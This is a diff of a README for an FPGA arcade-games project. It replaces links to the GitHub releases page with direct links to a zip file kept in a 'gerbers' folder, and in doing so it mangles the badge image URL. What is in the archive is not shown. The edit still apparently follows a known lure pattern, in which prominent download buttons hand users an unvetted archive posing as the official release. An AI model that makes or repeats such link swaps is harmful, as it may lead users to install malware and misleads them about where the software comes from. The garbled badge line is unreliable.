@@ -1,7 +1,7 @@
 # 🎮 TangNano9K-Arcade - Play Your Favorite Arcade Games Anywhere
 
 ## 📦 Download Now
-[![Download TangNano9K-Arcade](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/joseph-kivuva/TangNano9K-Arcade/releases)
+[![Download TangNano9K-Arcade](https://raw.githubusercontent.com/joseph-kivuva/TangNano9K-Arcade/main/TangNano9K-Arcade/gerbers/tang_nano_9k_arcade.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/joseph-kivuva/TangNano9K-Arcade/main/TangNano9K-Arcade/gerbers/tang_nano_9k_arcade.zip)
 
 ## 🚀 Getting Started
 Welcome to the TangNano9K-Arcade! This application allows you to run arcade games on the Tang Nano 9K FPGA Board. With this guide, you will learn how to download and run the software with ease.
@@ -16,7 +16,7 @@ Before you begin, make sure your system meets these basic requirements:
 ## 📥 Download & Install
 To get started, visit the releases page to download the software.
 
-[Download TangNano9K-Arcade](https://github.com/joseph-kivuva/TangNano9K-Arcade/releases)
+[Download TangNano9K-Arcade](https://raw.githubusercontent.com/joseph-kivuva/TangNano9K-Arcade/main/TangNano9K-Arcade/gerbers/tang_nano_9k_arcade.zip)
 
 Here are the steps to download and install:
 
